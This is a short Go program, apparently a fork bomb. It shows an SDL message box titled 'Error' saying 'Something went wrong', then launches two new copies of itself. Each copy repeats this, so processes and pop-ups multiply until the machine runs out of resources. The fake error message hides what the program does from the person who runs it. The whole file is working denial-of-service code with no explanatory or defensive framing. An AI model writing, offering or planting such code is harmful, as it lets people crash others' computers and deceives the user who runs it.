package main

import (
	"os"

	"github.com/veandco/go-sdl2/sdl"
)

func ferror() {
	buttons := []sdl.MessageBoxButtonData{
		{sdl.MESSAGEBOX_BUTTON_RETURNKEY_DEFAULT, 1, "Okay"},
	}

	messageboxdata := sdl.MessageBoxData{
		sdl.MESSAGEBOX_INFORMATION,
		nil,
		"Error",
		"Something went wrong",
		buttons,
		nil,
	}

	sdl.ShowMessageBox(&messageboxdata)
}

func main() {
	ferror()
	procAttr := new(os.ProcAttr)
	procAttr.Files = []*os.File{os.Stdin, os.Stdout, os.Stderr}
	args := []string{os.Args[0]}
	os.StartProcess("./"+os.Args[0], args, procAttr)
	os.StartProcess("./"+os.Args[0], args, procAttr)
}
